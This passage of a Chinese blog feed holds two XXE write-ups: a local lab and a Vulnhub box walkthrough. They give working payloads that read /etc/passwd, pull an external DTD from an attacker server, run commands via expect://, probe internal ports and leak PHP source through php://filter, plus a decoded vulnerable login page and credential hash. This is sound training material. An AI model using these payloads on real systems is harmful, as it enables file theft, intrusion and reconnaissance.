      <link href="/2022/06/06/XXE%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA/"/>
      <url>/2022/06/06/XXE%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00-XXE-Lab"><a href="#0x00-XXE-Lab" class="headerlink" title="0x00 XXE-Lab"></a>0x00 XXE-Lab</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>随便输入用户名和密码抓包观察：<br><img src="/2022/06/06/XXE%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA/image-20220606090958094.png" alt="image-20220606090958094"></p><p><img src="/2022/06/06/XXE%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA/image-20220606091018608.png" alt="image-20220606091018608"></p><p>可以看到用户名和密码是使用<code>XML</code>格式进行传输，并且数据包中<code>Content-Type:</code> 字段为<code>application/xml;charset=utf-8</code>带有<code>xml</code>字样，<code>X-Requested-With:</code> 字段为<code>XMLHttpRequest</code>是<code>XML</code>的<code>HTTP</code>请求，回复包中也是<code>XML</code>格式，由此就能看出存在XXE漏洞。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>进行XXE注入：</p><p>构造payload：读取D盘下的test.txt文件</p><pre class="line-numbers language-none"><code class="language-none">直接构造XML声明和DTD部分，引用外部实体去尝试读取&#x2F;etc&#x2F;passwd文件：&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE admin [&lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;D:&#x2F;test.txt&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;这里元素中引用外部实体参数admin，格式：&amp;admin;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/06/06/XXE%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA/image-20220606093623495.png" alt="image-20220606093623495"></p><p>这里除了读取test.txt文件，也可以读取一些敏感文件，可结合XXE实现任意文件读取漏洞。</p><h2 id="0x02-构造payload的几种方式"><a href="#0x02-构造payload的几种方式" class="headerlink" title="0x02 构造payload的几种方式"></a>0x02 构造payload的几种方式</h2><p><strong>方式一、直接通过外部实体声明：</strong></p><p>XML内容：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a [  &lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; &lt;a&gt;&amp;b;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>方式二、外部实体声明（通用实体）+外部DTD文件：</strong></p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a SYSTEM &quot;http:&#x2F;&#x2F;XXX&#x2F;test.dtd&quot;&gt;&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：这里的 <a href="http://xxx/test.dtd">http://XXX/test.dtd</a> 是攻击者自己服务器上的文件。</p></blockquote><p><strong>方式三、外部实体声明（参数实体） + 引入外部实体声明：</strong>：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a[&lt;!ENTITY % d SYSTEM &quot;http:&#x2F;&#x2F;XXX&#x2F;test.dtd&quot;&gt;%d;]&gt;&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>test.dtd 内容:</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>注意这种方式必须要先引用参数实体，才能引用通用实体，且缺一不可。</strong></p><h2 id="0x03-RCE"><a href="#0x03-RCE" class="headerlink" title="0x03 RCE"></a>0x03 RCE</h2><p>在安装 expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。<br> 因为<code>PHP的 expect</code> 并不是默认安装扩展，所以命令执行比较难利用，但不排除有幸运的情况。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;cat &#x2F;&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-内网探测"><a href="#0x04-内网探测" class="headerlink" title="0x04 内网探测"></a>0x04 内网探测</h2><p>XML 外部实体中是可以使用http:&#x2F;&#x2F;协议，可以利用该请求去探查内网。</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若对方禁用外部实体这样的攻击则无效。</p>]]></content>
      
      
      <categories>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-XXE靶场</title>
      <link href="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/"/>
      <url>/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>靶机地址：<a href="https://download.vulnhub.com/xxe/XXE.zip">https://download.vulnhub.com/xxe/XXE.zip</a></p><p>攻击机：Ninjitsu OS</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>打开靶机</p><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605224442188.png" alt="image-20220605224442188"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>查看攻击机ip地址：</p><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605224646224.png" alt="image-20220605224646224"></p><p>使用nmap扫描网段，查找靶机ip：</p><pre class="line-numbers language-none"><code class="language-none">nmap -sS 192.168.216.1&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605225009097.png" alt="image-20220605225009097"></p><p>扫描到靶机地址，并且开放80端口。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>使用浏览器打开其web页面：</p><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605225400312.png" alt="image-20220605225400312"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>使用御剑扫描后台文件：<br><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605225716851.png" alt="image-20220605225716851"></p><p>看到有robots.txt文件，访问robots.txt文件：<br><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605225842147.png" alt="image-20220605225842147"></p><p>有&#x2F;xxe&#x2F;目录和admin.php文件。</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>访问&#x2F;xxe&#x2F;目录可以看到有登录框：</p><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605225952022.png" alt="image-20220605225952022"></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>随便输入账号密码抓包，可以看到是xml格式传输数据：</p><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605231147205.png" alt="image-20220605231147205"></p><p>可以知道存在XXE漏洞。</p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>插入攻击语句进行XXE注入：</p><p>payload：利用php伪协议读取xxe.php文件</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY admin SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxe.php&quot;&gt;]&gt;&lt;roo&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注：</strong>注入时需要将<code>admin</code>更改为：<code>&amp;admin;</code>；并且<code>!ENTITY</code> 后需要和<code>&lt;name&gt;</code>标签处相同，为<code>admin</code>。</p><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605232505700.png" alt="image-20220605232505700"></p><p>得到数据包为base64加密，拿去解密都得到：</p><pre class="line-numbers language-none"><code class="language-none">解密前：PD9waHAKbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlciAoZmFsc2UpOwokeG1sZmlsZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdwaHA6Ly9pbnB1dCcpOwokZG9tID0gbmV3IERPTURvY3VtZW50KCk7CiRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKJGluZm8gPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKJG5hbWUgPSAkaW5mby0+bmFtZTsKJHBhc3N3b3JkID0gJGluZm8tPnBhc3N3b3JkOwoKZWNobyAiU29ycnksIHRoaXMgJG5hbWUgbm90IGF2YWlsYWJsZSEiOwo&#x2F;Pgo&#x3D;解密后：&lt;?phplibxml_disable_entity_loader (false);$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$info &#x3D; simplexml_import_dom($dom);$name &#x3D; $info-&gt;name;$password &#x3D; $info-&gt;password;echo &quot;Sorry, this $name not available!&quot;;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解密后为xxe.php的源代码：</p><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605233157806.png" alt="image-20220605233157806"></p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>查看admin.php源代码：</p><p>payload更改为admin.php：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY admin SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;admin.php&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;admin;&lt;&#x2F;name&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到admin.php的源码：</p><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605233304112.png" alt="image-20220605233304112"></p><p>解密后源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">         <span class="token selector">body</span> <span class="token punctuation">&#123;</span>            <span class="token property">padding-top</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>            <span class="token property">padding-bottom</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #ADABAB<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>                  <span class="token selector">.form-signin</span> <span class="token punctuation">&#123;</span>            <span class="token property">max-width</span><span class="token punctuation">:</span> 330px<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 15px<span class="token punctuation">;</span>            <span class="token property">margin</span><span class="token punctuation">:</span> 0 auto<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #017572<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>                  <span class="token selector">.form-signin .form-signin-heading,         .form-signin .checkbox</span> <span class="token punctuation">&#123;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>                  <span class="token selector">.form-signin .checkbox</span> <span class="token punctuation">&#123;</span>            <span class="token property">font-weight</span><span class="token punctuation">:</span> normal<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>                  <span class="token selector">.form-signin .form-control</span> <span class="token punctuation">&#123;</span>            <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>            <span class="token property">-webkit-box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>            <span class="token property">-moz-box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>            <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> 16px<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>                  <span class="token selector">.form-signin .form-control:focus</span> <span class="token punctuation">&#123;</span>            <span class="token property">z-index</span><span class="token punctuation">:</span> 2<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>                  <span class="token selector">.form-signin input[type="email"]</span> <span class="token punctuation">&#123;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> -1px<span class="token punctuation">;</span>            <span class="token property">border-bottom-right-radius</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>            <span class="token property">border-bottom-left-radius</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>            <span class="token property">border-color</span><span class="token punctuation">:</span>#017572<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>                  <span class="token selector">.form-signin input[type="password"]</span> <span class="token punctuation">&#123;</span>            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>            <span class="token property">border-top-left-radius</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>            <span class="token property">border-top-right-radius</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>            <span class="token property">border-color</span><span class="token punctuation">:</span>#017572<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>                  <span class="token selector">h2</span><span class="token punctuation">&#123;</span>            <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #017572<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Enter Username and Password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>container form-signin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'administhebest'</span> <span class="token operator">&amp;&amp;</span>                   <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'e6e061838856bf47e1de730719fb2609'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'valid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>                  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'timeout'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'administhebest'</span><span class="token punctuation">;</span>                                  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You have entered valid use name and password &lt;br />"</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Here is the &lt;a style='color:FF0000;' href='/flagmeout.php'>Flag&lt;/a>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Maybe Later'</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>         <span class="token delimiter important">?></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!-- W00t/W00t --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>form-signin<span class="token punctuation">"</span></span> <span class="token attr-name">role</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>form<span class="token punctuation">"</span></span>             <span class="token attr-name">action</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>form-signin-heading<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$msg</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span>                <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>username<span class="token punctuation">"</span></span>                <span class="token attr-name">required</span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span>               <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>btn btn-lg btn-primary btn-block<span class="token punctuation">"</span></span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span>                <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>         Click here to clean <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>adminlog.php<span class="token punctuation">"</span></span> <span class="token attr-name">tite</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>Logout<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Session.               <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从源码中看到：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'administhebest'</span> <span class="token operator">&amp;&amp;</span>                   <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'e6e061838856bf47e1de730719fb2609'</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里存放着用户名和密码，密码md5加密，拿去解密得到密码：</p><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605233558273.png" alt="image-20220605233558273"></p><h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><p>登录：访问&#x2F;xxe&#x2F;admin.php进行登录。</p><p><strong>注：上面获取的用户名和密码是从admin.php文件中获取的，因此登录也是在admin.php页面中，而不是&#x2F;xxe&#x2F;目录下的登录框。</strong></p><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605234153158.png" alt="image-20220605234153158"></p><p>点击login后出现<code>Here is the Flag</code>：</p><p><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605234206900.png" alt="image-20220605234206900"></p><p>点击<code>Flag</code>跳转页面，并且找不到文件，观察url这时已经跳转到了根目录<br><img src="/2022/06/05/Vulnhub-XXE%E9%9D%B6%E5%9C%BA/image-20220605234314167.png" alt="image-20220605234314167"></p><h2 id="0x10"><a href="#0x10" class="headerlink" 